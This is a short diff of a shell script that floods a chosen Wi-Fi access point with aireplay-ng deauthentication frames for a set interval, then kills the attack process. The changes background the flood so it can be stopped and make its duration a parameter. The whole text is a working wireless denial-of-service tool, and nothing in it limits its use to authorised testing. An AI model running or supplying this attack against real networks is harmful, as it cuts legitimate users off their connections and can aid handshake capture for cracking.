@@ -4,8 +4,8 @@ BSSID=$1
 interface=$2
 interval=$3
 
-
-aireplay-ng --deauth 0 -a $BSSID $interface
+echo $interval
+aireplay-ng --deauth 0 -a $BSSID $interface & # dont forget the & otherwise you cant kill this process
 aireplayPID=$!
-sleep 10
+sleep $interval
 kill $aireplayPID
